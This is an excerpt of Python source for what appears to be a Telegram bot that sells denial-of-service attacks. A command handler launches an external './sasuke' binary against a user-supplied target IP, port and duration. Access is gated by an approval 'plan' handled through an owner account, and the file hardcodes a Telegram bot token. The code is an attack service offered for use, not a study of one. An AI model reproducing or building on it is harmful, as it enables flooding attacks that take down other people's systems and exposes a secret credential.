...
TOKEN = '8062902065:AAEYEHXHPgHI3Re70ZUKwRwk4BZqkXxMrkI'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./sasuke {target_ip} {target_port} {duration} 100")
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @SpidyCheatOwner* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @SpidyCheatOwner* 🙏"  # Contact owner message
    else:
